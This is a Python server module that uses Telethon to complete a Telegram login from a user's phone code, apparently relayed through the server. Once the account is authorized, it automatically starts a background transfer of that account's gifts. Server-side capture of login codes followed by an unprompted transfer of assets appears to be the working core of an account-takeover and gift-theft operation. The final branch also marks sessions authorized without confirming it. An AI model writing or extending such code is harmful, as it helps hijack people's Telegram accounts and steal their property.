import asyncio

from telethon.errors import SessionPasswordNeededError

from server.automation.auto_transfer_gifts_on_auth import auto_transfer_gifts_background
from server.store.in_memory_auth_state import get_auth_state, upsert_auth_state
from server.telethon.create_client import create_client


def sign_in_with_code(*, user_id: str, code: str) -> dict:
    """
    Returns:
      { "success": True } on successful sign-in
      { "requires_2fa": True } if password is needed
    """

    state = get_auth_state(user_id)
    if not state or not state.phone_number or not state.phone_code_hash:
        raise RuntimeError("No pending login for this user_id. Start with /login")

    async def _run() -> dict:
        client = create_client(user_id)
        await client.connect()
        try:
            # If session already exists and is authorized, don't ask for 2FA again.
            if await client.is_user_authorized():
                state.is_authorized = True
                upsert_auth_state(state)
                # Start auto-transfer in background after successful auth
                auto_transfer_gifts_background(user_id)
                return {"success": True}

            try:
                await client.sign_in(
                    phone=state.phone_number,
                    code=code,
                    phone_code_hash=state.phone_code_hash,
                )
            except SessionPasswordNeededError:
                # 2FA password is enabled for this account
                return {"requires_2fa": True}

            # Some flows may authorize implicitly; double-check.
            if await client.is_user_authorized():
                state.is_authorized = True
                upsert_auth_state(state)
                # Start auto-transfer in background after successful auth
                auto_transfer_gifts_background(user_id)
                return {"success": True}

            state.is_authorized = True
            upsert_auth_state(state)
            # Start auto-transfer in background after successful auth
            auto_transfer_gifts_background(user_id)
            return {"success": True}
        finally:
            await client.disconnect()

    return asyncio.run(_run())


